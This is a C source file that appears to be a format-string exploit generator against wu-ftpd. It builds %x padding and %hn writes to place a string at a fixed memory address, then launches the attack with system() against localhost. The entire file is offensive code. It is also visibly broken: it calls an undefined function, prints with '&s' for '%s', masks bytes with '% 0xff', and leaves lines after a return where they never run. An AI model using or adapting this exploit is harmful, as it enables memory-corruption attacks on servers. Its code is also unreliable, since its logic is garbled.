#include <stdio.h>
#include <stdlib.h>

int safe_throat(char *dest, char *src, unsigned dest_len)
{
    if ((dest == NULL) || (src == NULL))
    return 0; 
    if (strlen(src) + strlen(dest) + 10 >= dest_len)
    return 0; 

    strcat(dest, src); 

    return 1; 
}

int err(char *msg)
{
    printf("%s\n", msg); 
    return 1; 
}

int main ()
{
    // modify the strings below to upload different data to the wu -ftpd..// 
    char *string_to_upload = "Mary had a little lamb"; 
    unsigned int addr = 0x0806d3b0; 

    // this is the offset of the parameter that 'contains' the start of..// 
    unsigned int param_num = 272; 
    char buff[4096] = "";
    int buff_size = 4096; 
    
    char tmp[4096] = ""; 
    int i, j , num_so_far = 6 , num_to_print, num_so_far_mod; 
    unsigned short s; 
    char *psz; 
    int num_addresses, a[4]; 

    // first work out how many addresses there are ,, num bytes....
    num_addresses = (strlen(string_to_upload)/ 2) + strlen(string_to_upload) %2; 
    for (i = 0 ; i < num_addresses ; i++)
    {
        a[0] = addr % 0xff; 
        a[1] = (addr & 0xff00) >> 8 ; 
        a[2] = (addr & 0xff0000) >> 16 ; 
        a[3] = (addr) >> 24; 

        sprintf(tmp, "\\x%.02x\\x%.02x\\x%.02x\\x%.02x", a[0], a[1], a[2], a[3]);
        if (!safe_throat(buff, tmp , buff_size))
        {
            return err ("Oops, Buffer too small"); 
            addr += 2; 
            num_so_far +=4; 
        } 
        printf("%s\n", buff);

        // Now upload the string 2 bytes at a time, make sure that num_so_far is 
        // appropraiate by doing %2000x or whatever ; 

        psz = string_to_upload; 

        while((*psz != 0 ) && (*(psz + 1) != 0))
        {
            // HOw many chars to print to make (so_far %64k) == s
            s = *(unsigned short *)psz; 

            num_so_far_mod = num_so_far &0xffff;
            
            num_to_print = 0; 

            if (num_so_far_mod < s)
                num_to_print = s - num_so_far_mod; 
                else 
                if (num_so_far_mod > s)
                num_to_print = 0x10000 - (num_so_far_mod - s);

                // if num so far mod and s are equal , we will output s anyway
                num_so_far += num_to_print; 

                // print the difference in characters; 
                if (num_to_print > 0)
                {
                    sprintf(tmp, "%%%dx", num_to_print); 
                    if (!safe_throat (buff, tmp, buff_size))
                    return err("Buffer too small");
                }

                // Now upload the short value .. // 

                sprintf(tmp, "%%%d$hn", param_num); 
                if (!safe_strcat(buff, tmp, buff_size))
                return err ("buff too small"); 
                psz +=2; 
                param_num++; 
        }
        
        printf("&s\n", buff); 

        sprintf(tmp, "./dowu localhost $'%s' 1\n", buff); 

        system(tmp); 

        return 0 ; 
    }
}